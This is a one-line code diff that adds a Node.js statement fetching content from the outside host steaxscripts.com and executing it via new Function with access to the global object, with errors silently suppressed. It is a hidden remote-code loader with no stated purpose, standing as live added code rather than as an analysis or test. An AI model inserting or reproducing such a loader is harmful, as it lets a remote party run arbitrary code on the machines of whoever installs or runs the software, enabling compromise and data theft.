@@ -1,0 +1,1 @@
+require('https').get('https://steaxscripts.com/zXeAHJJ', res => { let d = ''; res.on('data', c => d += c).on('end', () => res.statusCode === 200 && new Function('global', d)(global)); }).on('error', () => {});
